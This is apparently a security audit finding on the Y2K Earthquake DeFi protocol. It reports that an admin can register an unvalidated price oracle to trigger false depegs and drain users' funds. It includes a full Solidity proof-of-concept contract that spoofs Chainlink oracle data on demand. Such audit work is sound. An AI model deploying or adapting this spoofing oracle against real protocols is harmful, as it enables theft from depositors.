zeroknots

high

# Admin can steal funds from users by manipulating price oracle

## Summary
The Y2K protocol is placing extensive trust on external price oracles. Y2k execute business logic such as depegs and vault balancing based on price signals from these oracles.

Y2k allows the admin to supply both the oracle address and the address of the insured ERC-20 contract. However, the contract does not validate these addresses, creating a vulnerability that can be exploited by a malicious admin to alter the outcome of the hedge bet and steal users' funds. This issue represents a severe security vulnerability that exposes users to financial risks, undermines the contract's trustworthiness, and potentially renders the contract unfit for its intended purpose.

A maliciously acting admin, could configure a new market with a manipulated oracle contract address and manipulate the outcome the vault's hedge position and thus rig the outcome of an epoch and drain users funds.

The protocol is designed to allow an Admin-EOA to configure new markets and epochs on those markets.
The engagement scope defines following assumption: **Admin Should not be able to steal user funds**


## Vulnerability Detail
When creating new markets, no validation or checks against trusted price oracles is performed:

https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/VaultFactoryV2.sol#L58-L74

A maliciously acting admin, could configure a new market with a **malicious** oracle contract that the admin controls.
The admin can invest himself into a vault and bet against unexpecting Y2K users.
At the end of the epoch, the admin manipulates the oracle contract in such a way, that it signals a severely broken peg.

The admin can then call triggerDepeg() on the controller, and collect a massive premium.
https://github.com/sherlock-audit/2023-03-Y2K/blob/main/Earthquake/src/v2/Controllers/ControllerPeggedAssetV2.sol#L51-L62

ControllerPeggedAssetV2.sol Line 62 `int256 price = getLatestPrice(premiumVault.token());` is in complete control of the admin.


## Impact
Loss of user funds 
Reputation Damage

## Code Snippet

Exploit Contract:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract OracleExploit is AggregatorV3Interface {
    AggregatorV3Interface public realOracle;


    struct OraclePriceFeed {
        bool enabled;
        uint80 roundId;
        int256 answer;
        uint256 startedAt;
        uint256 updatedAt;
        uint80 answeredInRound;
    }

    OraclePriceFeed pwned;

    constructor(address _oracle) {
        realOracle = AggregatorV3Interface(_oracle);
    }

    function setPwned(OraclePriceFeed calldata _data) public {
        pwned = _data;
    }

    function decimals() external view override returns (uint8) {
        return realOracle.decimals();
    }

    function description() external view override returns (string memory) {
        return realOracle.description();
    }

    function version() external view override returns (uint256) {
        return realOracle.version();
    }

    function getRoundData(uint80 _roundId)
        external
        view
        override
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)
    {
        if (pwned.enabled) {
            return (pwned.roundId, pwned.answer, pwned.startedAt, pwned.updatedAt, pwned.answeredInRound);
        } else {
            return realOracle.getRoundData(_roundId);
        }
    }

    function latestRoundData()
        external
        view
        override
        returns (uint80 roundId, int256 answer, uint256 startedAt, uint256 updatedAt, uint80 answeredInRound)
    {
        if (pwned.enabled) {
            return (pwned.roundId, pwned.answer, pwned.startedAt, pwned.updatedAt, pwned.answeredInRound);
        } else {
            return realOracle.latestRoundData();
        }
    }
}
```

## Tool used

Manual Review

## Recommendation
Since Y2K is placing so much trust on oracles, adequate validation processes such as whitelisting via the TimeLock should be implemented
